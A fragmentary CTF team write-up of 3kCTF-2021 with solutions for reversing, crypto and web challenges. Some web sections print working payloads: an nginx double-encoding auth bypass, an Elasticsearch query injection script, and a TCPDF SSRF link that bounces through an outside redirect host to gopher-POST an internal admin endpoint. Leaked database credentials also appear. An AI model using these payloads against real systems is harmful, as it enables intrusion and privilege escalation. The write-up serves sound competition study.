\u0026#34;0x1EB0722D\u0026#34;-\u0026gt;\u0026#34;0x87679F00\u0026#34;[style=\u0026#34;dashed\u0026#34;] } Since v6 is the returning variable, we can see that the function is computing the sum of ASCII values, i.e., a1[0] + a1[1] + ...\nIn the similar fashion, I manually built the graphs for main and some of the functions called by main.

If you are interested on the deobfuscator, let\u0026rsquo;s wait if he is gonna write something about it.  Part II. Looking for the Algorithms By searching the constant available in sub_4008F0 (i.e., 0x61C88647), we found signs of Tiny Encryption Algorithm (TEA)3. By comparing to its implementation from Wikipedia4, we are convinced that sub_4008F0 is an encryptor of TEA.\nOn the other hand, sub_403EC0 is less trivial. It called sub_403090 once before the encryption is done - which I think is a key expansion algorithm. Eventually, I observed that dword_6060D0 is used in both of the functions above. I copied the first 16 bytes of it and searched on Google:\n\nThe subsequent bytes for dword_6060D0 match the S-boxes for Serpent. After all, the functions are implementing Serpent cipher. It is a lesser-known encryption algorithm - which is actually a candidate of AES. Up to now, I suspect that 0x606090 is the target ciphertext which is the encrypted flag. The key is derived by the sum of ascii values of the flag, which could be exhausted.\ndigraph { rankdir=LR node [shape=\u0026#34;box\u0026#34;] flag-\u0026gt;x1[label=\u0026#34;Serpent\u0026#34;] x1-\u0026gt;\u0026#34;bytes_606090\u0026#34;[label=\u0026#34;TEA\u0026#34;] x1[shape=\u0026#34;point\u0026#34;] } Unfortunately, we are unable to recover the flag. Unknowningly what happened, I decided to sleep.\nWhile I am asleep, harrier has notified us that the binary for the challenge is updated. There are one solve immediately after. This got me thinking: What I had is correct, but the ciphertext given from the previous binary is wrong. Hence, I updated my script with the new ciphertext and execute again - and I am able to get the flag:\nflag{_a1f040be800d4dd9a2b9a7d2b8f2be31_} p(a)wnshop (Web; 478 points) Solved by ozetta.\nThe first goal of this challenge is to access the admin backend service with this nginx configuration:\nlocation ~admin { auth_basic \u0026#34;pawnshop admin\u0026#34;; auth_basic_user_file /etc/nginx/.htpasswd; } location ~^/backend/(.*)$ { proxy_pass http://172.30.0.6:8080/$1; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $http_connection; } The challenge states that we should not brute force .htpasswd. So accessing /backend/admin.py with a valid password seems impossible. But luckily we can bypass the restriction with double-encoding: /backend/%2561dmin.py\nThen we need to inject the Elasticsearch query:\n\u0026#39;query_string\u0026#39;: { \u0026#39;query\u0026#39;: \u0026#39;id:\u0026gt;0 AND seller:\u0026#34;\u0026#39;+emailAddr+\u0026#39;\u0026#34;\u0026#39;, \u0026#34;default_field\u0026#34;:\u0026#34;seller\u0026#34; } where the email address is validated:\nfrom email.utils import parseaddr def verify_email(mail): parsedEmail = parseaddr(mail)[1] if parsedEmail == \u0026#39;\u0026#39; or parsedEmail != mail or not re.findall(r\u0026#39;.+@.+\\..+\u0026#39;,parsedEmail): api({\u0026#39;msg\u0026#39;:\u0026#39;invalid email\u0026#39;}) So the standard way to fulfill the validation while injecting the query is to use a pair of quote in the email name. To make a query we can reuse the UI provided:\nfunction x(q){ $.ajax({ url: \u0026#39;/backend/%2561dmin.py\u0026#39;, type : \u0026#34;POST\u0026#34;, data : {\u0026#34;action\u0026#34;:\u0026#34;lookup\u0026#34;,\u0026#34;mail\u0026#34;:\u0026#39;\u0026#34; AND value:*\u0026#39;+q+\u0026#39;* AND seller:\u0026#34;jmfffc@pawnshop.2021.3k.ctf.to\u0026#39;}, success : function(result) { console.log(result.msg); } }) } Note that jmfffc@pawnshop.2021.3k.ctf.to is the email address of the flag seller. Originally I use both upper case and lower case characters (and also some special characters like the underscore) in the query but I found that the query is case insensitive, so I remove the upper case characters later on.

Basic Knowledge Fermat Little Theorem: $a^p\\equiv a \\pmod p$ for all prime number $p$'s, or equivalently,\n\\[ a^{p-1} \\equiv \\left\\{ \\begin{array}{ll} 0 \u0026 a \\bmod p \\equiv 0\\\\ 1 \u0026 \\text{otherwise} \\end{array} \\right. \\pmod p\\]\nfor all prime number $p$'s.\nPart II. Analysis The program uses OpenSSL.crypto as the RSA private key loading library.\nGiven $m$ and $c$, the final target of the challenge is to generate a private key such that $m^d \\bmod N = c$.\nwith the constraints\n $d \u0026gt; 1337^5$ (i dont like small numbers) $N \\bmod 2 \\neq 0$ (and i dont like even numbers).  The beginning of the source code checks whether the following key is valid:\n-----BEGIN RSA PRIVATE KEY----- MBsCAQACAS0CAQcCAQACAQ8CAQMCAQACAQACAQA= -----END RSA PRIVATE KEY----- The key reads as the following:\nversion = 0x00 (0) modulus = 0x2d (45) public exponent = 0x07 (7) private exponent = 0x00 (0) prime1 = 0x0f (15) prime2 = 0x03 (3) exponent1 = 0x00 (0) exponent2 = 0x00 (0) coefficient = 0x00 (0) Apparently 15 is neither a prime nor coprime with 3, and all parameters involving modular inverse calculations are set to 0. So this should be an invalid key.\nHowever, earlier versions do not recognize this invalid key pattern, so it may pass the check.\nHence this check in the source code is used tell us that the challenge server is not using the older version that allows such kind of invalid keys.\nimport OpenSSL.crypto as crypto rsa_p_not_prime_pem = \u0026#34;\u0026#34;\u0026#34;\\n-----BEGIN RSA PRIVATE KEY-----\\nMBsCAQACAS0CAQcCAQACAQ8CAQMCAQACAQACAQA=\\n-----END RSA PRIVATE KEY-----\\n\u0026#34;\u0026#34;\u0026#34; invalid_key = crypto.load_privatekey(crypto.FILETYPE_PEM, rsa_p_not_prime_pem) error_msg = \u0026#34;Pycrypto needs to be patched!\u0026#34; try: invalid_key.check() raise RuntimeError(error_msg) except crypto.Error: pass Obviously this is not pycrypto but OpenSSL.crypto library.\nThe expected error message (if printed out) is (realigned):\nOpenSSL.crypto.Error: [ ( \u0026#39;rsa routines\u0026#39;, \u0026#39;RSA_check_key_ex\u0026#39;, \u0026#39;p not prime\u0026#39; ),( \u0026#39;rsa routines\u0026#39;, \u0026#39;RSA_check_key_ex\u0026#39;, \u0026#39;d e not congruent to 1\u0026#39; ),( \u0026#39;bignum routines\u0026#39;, \u0026#39;BN_mod_inverse\u0026#39;, \u0026#39;no inverse\u0026#39; ) ] Since the error list is actually quite comprehensive, which means we had better use a valid RSA key with two primes.\nPart III. Making Use of the Theorem(s) Since we know that $a^{p-1} \\equiv 1 \\pmod p$ for all $a$'s such that $0 \\lt a \\lt p$, we can conclude that $a^x - a^{x \\bmod{(p-1)}} \\equiv 0 \\pmod p$ for all possible $a$'s for all non-negative integer $x$'s.\nTo fulfill the modular equation in the challenge, the modulus $N$ needs to be larger than $c$, which means we need to have primes $p$ and $q$ such that $pq \u0026gt; c$.\nInstead of finding $N$ directly, we can make use of the Chinese remainder theorem to construct the values of $N$, $d$, and $e$ if we can obtain two equations like this:\n\\[ \\left\\{ \\begin{array}{ll} m^{x_p} \\equiv c \\pmod p \\\\ m^{x_q} \\equiv c \\pmod q \\end{array} \\right. \\]\nThen we have\n\\[ \\left\\{ \\begin{array}{ll} d \\bmod{(p-1)} \\equiv x_p \\\\ d \\bmod{(q-1)} \\equiv x_q \\end{array} \\right. \\]\nNotice that for odd prime $p$ and $q$, both $p-1$ and $q-1$ are even, which means $\\phi(N)$ (Euler's totient function) must be even. Therefore, in most cases $d$ has to be odd so that $e$ can be obtained, i.e. $d$ is invertible under modulo $\\phi(N)$. (Since the value of $\\lambda(N)$ (Carmichael function / Reduced totient function) is always even except that $\\lambda(1) = \\lambda(2) = 1$, no such exception exists)\nThis means for example there is no use finding an even $x_p = p - 1$ where $p$ is $260163...128287$ (a 183-digit prime factor of $c-1$5), so $m^{p-1}\\equiv 1 \\equiv c \\pmod p$.\nTo generalize, we only need $x_p = p - 1 + b$, where $p$ is a prime factor of $c - m^b$ for odd $b$. Here $m^{x_p} \\equiv m^{p-1+b}\\equiv m^b \\equiv c \\pmod p$.\nWith the help of Alpertron6, we obtained the largest factor of $c-m^7$, which is $r_1 := 795088...535639$ (185 digits)7 and the largest factor of $c-m^{11}$, which is $r_2 := 140515...084809$ (190 digits)8.\nHowever, these two factors do not work, why?\nThe reason is that $\\text{GCD}(p-1, q-1)=42$, and $7 \\not\\equiv 11 \\pmod{42}$.\nTherefore, we continued and went into a long way of dealing with the factorization of much larger numbers (Since $m^{12}\\gt c$, $m^b$ becomes exponentially greater than $c$ for $b \\geq 12$), and found the largest prime factor of $-(c-m^{27})$, which is $r_3 := 156985...742221$ (468 digits!!!)9\nNote: Since RSA Private Key requires two primes, so we cannot just use this alone although this already far exceeds $c$  Now let's try to find the GCD again.\n $\\text{GCD}(r_1-1, r_2-1)=42$ $\\text{GCD}(r_1-1, r_3-1)=2$ $\\text{GCD}(r_2-1, r_3-1)=4$  Since $7\\equiv11\\equiv27\\pmod 4$, so using either of them along with the new prime factor is fine. (Really?)\nIn this case, we have chosen $r_2$.\nActually the pair using $r_1$ does not work (to be explained later).  Since these two numbers are not coprime, we actually have to set up three equations for the CRT.\n\\[ \\left\\{ \\begin{array}{ll} d \\bmod{\\frac{r_2-1}{8}} \\equiv 11 \\\\ d \\bmod{\\frac{r_3-1}{4}} \\equiv 27 \\\\ d \\bmod{8} \\equiv 3 \\end{array} \\right. \\]\nBy the Chinese Remainder Theorem, we have $d = 469849...444147$.\nPart IV: Generating the Private Key So we can generate the private key, by submitting the proof of work and the key to the challenge server to obtain the flag:\nn = p * q e = pow(d, -1, (p - 1) * (q - 1)) from Crypto.PublicKey import RSA key = RSA.construct((n, e, d)) print(key.export_key().decode()) Sample Private Key:\n-----BEGIN RSA PRIVATE KEY----- MIIFJAIBAAKCAREUDyj+A0LeFPNuAY78kHjkqce86Hut6sL7GR4UG67f9yPyVi62 AHgbEXBRqPUVL2irfgqa/RoGqsSPnT8THeqgHpFbxErqDihyRjPgXEQYiMGG00rY ZxGvESxd1V5WnwRi5qIYtodcYpH4W3mzRS13OkPwE9MghZpbDLv/MQuoga9hsWDx 6HnMqjn1QKJQCFMFJkf3jhl+B0U+qAiKFbNoFxw94n7S5iXHvktsNYfXfBlBWfYH h3xvjbxCCEqcJCCJY58nihI88dVJizXWPAk6EdVFmz2A9Aepk/sQDx39IPv/gYCI xH6HHnwNZGhasTk0SPMpelgpDj/EIVr67cHTt16MMGNse2nLNhJ4xCJ2nXUCggER C2ZYKkUhLkMbl2cpuicTznJnfg1tJfW6OUg3SVQ/hF5iyxtIEC1dB0lQFEInzU94 OZ5UbFuXsFKH2LoUgW28c+lEi7ZEVgADYSK/vRXJ1gg2SJXpXq+fAgK2rup2jYUH fs4uTTHEdHZsn68HmI2vSfbE+YnAPQgKV2wfKxHjTyac9CnKUBS4vgg7r7NFXwrF UKxA/KW2JqItgGHQOO3f+CUzvncdjEt+DZtLzICYnjYCgpcdCppfPJnbjLgEoUMX Ce/dFZBduXTyJTZYjivkAQPcqnrtb9001p4znE2qW2oYwkJnbMI3nYfUY8ZPgFR9 0skLeaZGnhJ9nioPMuJm58vnXhjTbxoHb3SZ6/+pYjJbAoIBEQRFxqXzpe/5sPhX +8QJ1HFaynfmBMXlq07MtzOIwUimHVg+O2GuXGp1PmfJncsZnl2FDprTMtb8KF7s 2XZwQTqNb34gLL1Ux78HzL6hyjrMXUOuusNa/fyssajrBYG5vO7VpxFWstZOPNk+ ThMh3XYLTUPhuVyQ/ng5mh0tM1bV1fhAzuzOSU83Mm0rNHkJxU0BNry1wYaGEgTa FpxETEG1rvt+KG+KPwvb/tMsznZqfFMUxnpRfCIHWZHSXjVqo73kmHnNCBn8reFs 7kWHA+k0ZAkfwCJpzNPsHthFFM795d0aFR8QjH0FJmSerAX1joJlVApGWSkQfhlJ aLZCC/+cqWXftq9VkFcmMjwNu95d8wKBwwD+aqp1+dd5Fwl4cpmIN55IlSY868Lv +YzuZCKcJjVzXZgkjOpegziBN+gWVVn0j5MMFn+hHYCN0j0ZKKAFVASxLBwIN+Wb yppI5gaqj99utjptpoUnI0W4hHk6d3OpnT/8vcPhsSesupTB9DYtsH7oq1b9ynVm z7GTI+GRwhfa5/YCqi57jlVKbo7M4Tvw2JN05HRNzVbjZefjy1PLK9esnYY0qcQY bxywSF5kyOj9Pd8Ao/tCLbNZH3i7E8Et/iIajQJPFC8eR3E5VZniAqLKfNtngNS/ IfhKGDHGZxZ+psfLx9USKT2Lrnp/dM6VKPZIzNz1BcYRWj2GFVi35tW7npDcVnZS rWBlpm/MJnNgH2oIiQIBGwIBCwKBwkzSg9YK9nvOxmDugCz+LNi82wRBhKiDpXGx ZN2pamHx+lndJRWC9fslPEOCgkhngdN3kSUMRJrhP84df3I44XthJIYn33mXteFZ noWHut0IHxERByKpmAH7cU4+YogwyV0PlhVvjJBq/zYHYhSJqRE5upl+TZxSg8aD n7Mf5EHaUUjTxBO9xvkJntaDJAjKcZC7+s45wiJphO0I7uJ7s9cI9hqz4GBnZ7AH bJ+WsYQzn+HtKK9H2mNaWklsHJ7OeYBl -----END RSA PRIVATE KEY----- For the completeness, here we explain why the pair using $r_1 - 1$ does not work:\nBoth the calculated $d$ ($213175\u0026hellip;494107$) and $p-1$ ($r_1 - 1$) are divisible by $7$, so $d$ has no inverse under modulo $(p-1)(q-1)$, thus there are no $e$s.

But the input got a length limitation. After a while, our teammate apple has registered an account successfully with an unknown payload. For some unknown reason I cannot reproduce his payload. But anyway we tried the second part of the challenge, which is to exploit the TCPDF to leak the flag.

We managed to find some other payload that corrupts the JSON input in Python. Then I found that a sufficiently large number like 3e333 will result in INF in PHP, which is invalid in Python. But it could not be used to bypass the invitation code and apple found that it is because INF's string length is 3, which is less than 4 and fails in a checking condition.\nforeach ($data[\u0026#39;d\u0026#39;] as $key =\u0026gt; $value) { if(strlen($value)\u0026lt;4) puts(0); } Then we changed the payload to negative infinity like -3e333 and managed to bypass the restriction.\nFor the TCPDF part, we have to review the source code, which is unpleasantly long:\nhttps://raw.githubusercontent.com/the3000org/3kCTF2021/master/web/ppaste/source/www/TCPDF/tcpdf.php\nand my computer crashes when I view in Github directly. 🥳\nAnyway, the vulnerability is in the getHtmlDomArray function:\nprotected function getHtmlDomArray($html) { // array of CSS styles ( selector =\u0026gt; properties).  $css = array(); // get CSS array defined at previous call  $matches = array(); if (preg_match_all(\u0026#39;/\u0026lt;cssarray\u0026gt;([^\\\u0026lt;]*)\u0026lt;\\/cssarray\u0026gt;/isU\u0026#39;, $html, $matches) \u0026gt; 0) { if (isset($matches[1][0])) { $css = array_merge($css, json_decode($this-\u0026gt;unhtmlentities($matches[1][0]), true)); } $html = preg_replace(\u0026#39;/\u0026lt;cssarray\u0026gt;(.*?)\u0026lt;\\/cssarray\u0026gt;/isU\u0026#39;, \u0026#39;\u0026#39;, $html); } // extract external CSS files  $matches = array(); if (preg_match_all(\u0026#39;/\u0026lt;link([^\\\u0026gt;]*)\u0026gt;/isU\u0026#39;, $html, $matches) \u0026gt; 0) { foreach ($matches[1] as $key =\u0026gt; $link) { $type = array(); if (preg_match(\u0026#39;/type[\\s]*=[\\s]*\u0026#34;text\\/css\u0026#34;/\u0026#39;, $link, $type)) { $type = array(); preg_match(\u0026#39;/media[\\s]*=[\\s]*\u0026#34;([^\u0026#34;]*)\u0026#34;/\u0026#39;, $link, $type); // get \u0026#39;all\u0026#39; and \u0026#39;print\u0026#39; media, other media types are discarded  // (all, braille, embossed, handheld, print, projection, screen, speech, tty, tv)  if (empty($type) OR (isset($type[1]) AND (($type[1] == \u0026#39;all\u0026#39;) OR ($type[1] == \u0026#39;print\u0026#39;)))) { $type = array(); if (preg_match(\u0026#39;/href[\\s]*=[\\s]*\u0026#34;([^\u0026#34;]*)\u0026#34;/\u0026#39;, $link, $type) \u0026gt; 0) { // read CSS data file  $cssdata = TCPDF_STATIC::fileGetContents(trim($type[1])); if (($cssdata !== FALSE) AND (strlen($cssdata) \u0026gt; 0)) { $css = array_merge($css, TCPDF_STATIC::extractCSSproperties($cssdata)); } } } } } } Interestingly, the parsing for the link tag \u0026lt;link type=\u0026quot;text/css\u0026quot; href=\u0026quot;somefile.css\u0026quot;\u0026gt; does not require the space in between. So \u0026lt;linktype=\u0026quot;text/css\u0026quot;href=\u0026quot;somefile.css\u0026quot;\u0026gt; also works. And TCPDF_STATIC::fileGetContents will call curl eventually:\nhttps://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1898\nGreat we got SSRF!

You should see the User-Agent is tc-lib-file.\nThen I try to leak the information downloaded as a part of CSS, which will be stored in a special tag \u0026lt;cssarray\u0026gt; later. It looks possible to leak the flag because of the flag format:\n\nLater we found that there is a function in the internal service to set a user's privilege to admin:\n@app.route(\u0026#39;/users\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def users(): if request.method == \u0026#39;POST\u0026#39;: myJson = json.loads(request.data) if(myJson[\u0026#39;user\u0026#39;]): qDB(\u0026#34;UPDATE users SET priv=not(priv) WHERE user=? \u0026#34;,\u0026#34;setAdmin\u0026#34;,myJson[\u0026#39;user\u0026#39;]) return json.dumps(True) else: return json.dumps(False) return json.dumps(qDB(\u0026#34;SELECT user,priv FROM users\u0026#34;)) But it requires POST... After a while I found the curl used before will accept redirection:\nhttps://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1969\nSo we can use the redirect trick to SSRF a gopher to POST in internal service. Then I spent some significant time to handcraft the payload and got it wrong several times because of the encoding issue 🙈.\nAnyway here is the final payload to put in the note's title:\n\u0026lt;linktype=\u0026#34;text/css\u0026#34;href=\u0026#34;http://poc.mm2.in/302.php?1=gopher%3A%2F%2F127.0.0.1%3A8082%2F_POST%2520%2Fusers%2520HTTP%2F1.1%250d%250aContent-type%3A%2520application%2Fjson%250d%250aContent-length%3A%252019%250d%250aHost%3A%2520127.0.0.1%3A8082%250d%250a%250d%250a%7B%22user%22%3A%22USERNAME%22%7D%250d%250a\u0026#34;\u0026gt; Then generate a pdf for this note will trigger SSRF, and then visit the admin page will get the flag.\n3K_SIGNER (Web; 495 points) Solved by ozetta.\nThis challenge got a lot of unpleasant API calls.

But how to get a signed token without admin right? Mystiz got a good eyesight on the checking function instead:\nreg = re.compile(\u0026#34;[0-9a_f]{32}\\Z\u0026#34;, re.I) def check_valid_token(intoken): if bool(reg.match(intoken)): rez=Tokens.query.filter(Tokens.token.ilike(intoken)).first() print(rez) if rez: return True else: return False else: return False For some unknown reason it uses case-insensitive like for checking and the regular expression contains _. So '_'*32 would be a valid token.\nNow we can play with the converter. This is similar to my previous challenges LibVOrifice and Conversion Center. Apparently the old payload =WEBSERVICE() did not work. To exploit unoconv we can refer to this more recent research11. The Postscript payload seems not working, but the OLE Object xLinking works well.\nI later on found that the CTF was ending soon (less than 30 minutes left) after I solved the challenge. That makes me look like flag hoarding, but no 🤫.\n\nOur teammates were working on Password Manager, and almost got the flag (missed one character). When they saw the bot message they thought their challenge was solved, but no 😒.\nPassword Manager (Reverse; 493 points) Solved by Mystiz, harrier and cdemirer.\nWe are given an archive file with password_manager.exe, log.dat and a bunch of .dll files. As a slightly seasoned reverse engineer, we knew password_manager.exe is the file the challenge. harrier searched about the .dlls online and found Renci.SshNet.dll is a .NET library for SSH - which he implied that the binary is written in .NET.\nPart I. Getting Started Since no one is working on this challenge, I decided to have a try on the challenge because I think .NET is not difficult to play with. To begin, I spun up my dusted Windows machine and load the binary with dnSpy. The taskQuals namespace caught my attention. For example, this is part of the eval_c inside the namespace:\n// Token: 0x0600002C RID: 44 RVA: 0x00003F10 File Offset: 0x00002110 private void eval_c(object A_0, EventArgs A_1) { int a_ = 14; short num = (short)1021706240; int num2 = (int)num; switch (num2) { default: { num = (short)2018443264; // Omitted...  for (;;) { // Omitted...  switch (num2) { // Omitted...  case 15: { string text4 = Form1.b(\u0026#34;鯇迉胋词鏏蛑ﳕ볙껛뇝跟싡\u0026#34;, a_); char value3; text4 = text4 + Conversions.ToString(value3) + Form1.b(\u0026#34;\u0026#34;, a_); MySqlCommand mySqlCommand = new MySqlCommand(text4, mySqlConnection); text += Convert.ToString(RuntimeHelpers.GetObjectValue(mySqlCommand.ExecuteScalar())); num = (short)1661272070; num2 = (int)((IntPtr)num); continue; } // Omitted...  } IL_24B: text5 = Form1.b(\u0026#34;꫇ꯉ꿋꫍뗏듑돓뻕뇗냙럛닝跟賡诣雥駧飩鿫髭藯蓱菳軵臷胹뷻볽䏿䘁䄃䀅伇䈉䔋䐍嬏帑夓堕圗䨙䴛䰝猟瘡焣瀥缧爩甫琭\u0026#34;, a_); text2 = Form1.b(\u0026#34;﯉ﻋ﷍﷛﷝쓟쟡싣쳥엧쇩싫틭컯쿱듳짵\u0026#34;, a_); dictionary = new Dictionary\u0026lt;string, string\u0026gt;(); dictionary.Add(Form1.b(\u0026#34;\u0026#34;, a_), Form1.b(\u0026#34;\u0026#34;, a_)); dictionary.Add(Form1.b(\u0026#34;\u0026#34;, a_), Form1.b(\u0026#34;\u0026#34;, a_)); // Omitted...  dictionary.Add(Form1.b(\u0026#34;\u0026#34;, a_), Form1.b(\u0026#34;\u0026#34;, a_)); dictionary.Add(Form1.b(\u0026#34;裇\u0026#34;, a_), Form1.b(\u0026#34;難\u0026#34;, a_)); string connectionString = Form1.b(\u0026#34;믇꿉뻋룍뗏ꃑ헟쳡틣헥웧틩퓫헭藯臱釳蓵엷釹駻賽狿洁㼃戅椇縉洋氍焏愑焓⬕猗缙眛┝借䴡嘣別ᔧᤩἫḭدऱ䐳圵䬷䤹䬻儽㈿♁祃ⵅⵇ㡉㹋⅍歏\u0026#34;, a_); mySqlConnection = new MySqlConnection(connectionString); mySqlConnection.Open(); string text6 = this.input.Text; // Omitted...  } return; IL_B0: value2 = Form1.b(\u0026#34;诇韛볋韍뷏\u0026#34;, a_); num = (short)185991170; num2 = (int)((IntPtr)num); goto IL_59; } } } It seemed to me that the program is obfuscated in a similar way Layer did - num2 is the state and it controls the code block to be executed by switch. There are some interesting snippets, for instance, the below snippet should result in connecting to a MySQL database:\nstring connectionString = Form1.b(\u0026#34;믇꿉뻋룍뗏ꃑ헟쳡틣헥웧틩퓫헭藯臱釳蓵엷釹駻賽狿洁㼃戅椇縉洋氍焏愑焓⬕猗缙眛┝借䴡嘣別ᔧᤩἫḭدऱ䐳圵䬷䤹䬻儽㈿♁祃ⵅⵇ㡉㹋⅍歏\u0026#34;, a_); mySqlConnection = new MySqlConnection(connectionString); mySqlConnection.Open(); As suggested, the gibberish inside Form1.b should represent a connection string. Let's look at the function.\nPart II. What is Form1.b hiding? // Token: 0x06000039 RID: 57 RVA: 0x00005844 File Offset: 0x00003A44 internal static string b(string A_0, int A_1) { char[] array = A_0.ToCharArray(); int num = (int)((IntPtr)(1681160370 + A_1) + (IntPtr)15 + (IntPtr)52 + (IntPtr)59 + (IntPtr)39 + (IntPtr)98); int num3; int num2; if ((num2 = (num3 = 0)) \u0026lt; 1) { goto IL_6A; } IL_37: int num5; int num4 = num5 = num2; char[] array2 = array; int num6 = num5; char c = array[num5]; byte b = (byte)((int)(c \u0026amp; 0xff) ^ num++); byte b2 = (byte)((int)(c \u0026gt;\u0026gt; 8) ^ num++); byte b3 = b2; b2 = b; b = b3; array2[num6] = (ushort)((int)b2 \u0026lt;\u0026lt; 8 | (int)b); num3 = num4 + 1; IL_6A: if ((num2 = num3) \u0026gt;= array.Length) { return string.Intern(new string(array)); } goto IL_37; } The above C# code has the same logic to the below Python function. Hence, we are able to decode the strings they obfuscated.\ndef form_a(x, b): offset = b+185 output = [] for j, xc in enumerate(x): output.append(((ord(xc)\u0026gt;\u0026gt;8) ^ (offset+2*j+1)) \u0026amp; 0xff) return bytes(output).decode() For example, the connection string they used to connect to the MySQL server is decoded into below. We are now able to connect to the database ourselves!\nserver=159.65.63.88;user=kerro;database=kek;port=3306;password=kerro; Part III. Database-as-a-Encryption Service After connected to the database, I found that there are 52 tables, namely, a, b, ..., z, A, B, ..., Z. Interestingly, there is only one row in each of the tables. For example,\nmysql\u0026gt; select * from a; +------+ | cont | +------+ | e | +------+ 1 row in set (0.24 sec) mysql\u0026gt; select * from b; +------+ | cont | +------+ | f | +------+ 1 row in set (0.18 sec) It looks like a rotation on characters. From my sampled queries, I guess their corresponding input-output pairs are:\nINPUT | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ OUTPUT | efghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$% They are added to the dictionary. There are a number of key-value pairs being added to the dictionary. These are the pairs in the dictionary:\nINPUT | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;*-+.\u0026lt;\u0026gt;=@?0123456789 OUTPUT | efghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;*-+.\u0026lt;\u0026gt;=@?0123456789abcd After all, it is a ROT-4 cipher in the given character set - and the database is served as a part of the encryption mapping.\nWhere is this used? We will see.  Part IV. Recovering the additional binaries From the code, we have traces about a new binary is constructed and written to file1.exe:\nbinary_1 = new byte[] { 77, 90, 144, 0, 3, /* ...omitted... */ 116, 32, 98, 101 }; binary_2 = File.ReadAllBytes(\u0026#34;./log.dat\u0026#34;); byte[] final_array = binary_1.Concat(binary_2).ToArray\u0026lt;byte\u0026gt;(); global::eval_c.eval_a.FileSystem.WriteAllBytes(\u0026#34;./file1.exe\u0026#34;, final_binary, true); Since log.dat is attached, we are able to reconstruct file1.exe ourselves. There is a curious function in file1.exe when opened with IDA Pro: sub_1400013F0. It is a huge function, but most of the operations are simply value assignments:\nint __cdecl sub_1400013F0(int argc, const char **argv, const char **envp) { FILE *File; // ST20_8  char Str; // [rsp+30h] [rbp-186B8h]  char v6; // [rsp+31h] [rbp-186B7h]  char v7; // [rsp+32h] [rbp-186B6h]  char v8; // [rsp+33h] [rbp-186B5h]  // Omitted  Str = 77; v6 = 90; v7 = -112; v8 = 0; v9 = 3; // Omitted  v16384 = 0; v16385 = 0; v16386 = 0; v16387 = 0; v16388 = 0; memset(\u0026amp;v16389, 0, 83616ui64); File = fopen(\u0026#34;file.exe\u0026#34;, \u0026#34;wb\u0026#34;); fwrite(\u0026amp;Str, 1ui64, 0x4000ui64, File); fclose(File); sub_140001000(\u0026#34;./file.exe\u0026#34;); return 0; It is pretty evident that there is another binary called file.exe, and we are able to build it from the above source code.\nPart V. Microsoft's Cryptographic Provider We are given the key the3kctfteamftw!! and 29 bytes of the ciphertext:\n5b d6 a5 3f f2 17 88 ed 47 d7 2c a1 a4 5e ff e7 e6 06 8c 99 a1 99 ee 6e 6f f8 4a b4 2c The cryptographic details in file.exe is pretty hairy. Since it is using Microsoft Enhanced RSA and AES Cryptographic Provider and there are no documentation, I don't know how did they derive the AES-key from the 17-byte seed key, nor the mode of operation they used. The only thing I knew is they used SHA256 to derive the AES-key and encrypt with AES128.\nHowever, I recalled that there is a challenge in Cyber Apocalypse 2021 that used Microsoft's API with SHA256 and AES128 too. Maybe we can refer to the write-ups? harrier referred me to the write-up12 that contain its Python implementation. Well... I better assume that is a black-box and modify the source code to fit my goal... Wait, what is it?\nPart VI. Understanding the Objective From file.exe, the objective is to find a message such that its the first 29 bytes of the ciphertext is given as 5b d6 a5 ... 4a b4 2c as specified above.\nNote. The code has an different checking condition checks if target_c[0] ^ c[0] ^ target_c[1] ^ c[1] ^ ... = 0. However, this loose condition is also enforced in the author\u0026rsquo;s remaining challenges Crackme and Layers. I think it is safe to assume that the real intention is target_c[i] == c[i] for all i\u0026rsquo;s\u0026hellip;  The ciphertext comes from the clipboard, which is overwritten in password_manager.exe. There is an input box in the password manager. To copy something to the clipboard, one must have C0pYm3 copied in the clipboard. Otherwise the password manager will be closed. After that, the content in the input box will be encrypted with the ROT-4 cipher we mentioned in part III and will be copied to the clipboard. Hence, our objective is to find password that satisfies the below condition.\nAES128(ROT4(password), key)[:29] == target_ciphertext Since it is hard for me to switch to my Windows machine, I decide to patch the script and send it to harrier for me to run. There are some bugs and cdemirer helped fixing. Eventually, we are able to get it working. There are multiple candidates for the password. The most reasonable one is AsIOnc3Said!F4ceb00KIs3viL!=# - and we have the flag 20 minutes before the CTF ends!\n3k{AsIOnc3Said!F4ceb00KIs3viL!=#}  https://en.wikipedia.org/wiki/Rabin_cryptosystem#Decryption [return] https://www.w3.org/TR/REC-png-961001 [return] https://twitter.com/codexgigassys/status/765743255917125632 [return] https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm [return] http://factordb.com/index.php?id=1100000002583673291 [return] https://www.alpertron.com.ar/ECM.HTM [return] http://factordb.com/index.php?id=1100000002583690582 [return] http://factordb.com/index.php?id=1100000002583705568 [return] http://factordb.com/index.php?id=1100000002583719246 [return] https://tcpdf.org/examples/example_049/ [return] https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/ [return] https://ctftime.org/writeup/27932 [return]   ","permalink":"https://b6a.black/posts/2021-05-22-3kctf/","summary":"We are united to play 3kCTF-2021 and result in the second place.

I'll include the challenges Wii Phit and Hyper Metroid in this writeup.\nWii Phit  The aliens have encrypted our save file from Wii Phit and we’re about to lose our 4,869 day streak!! They’re even taunting us with a hint.

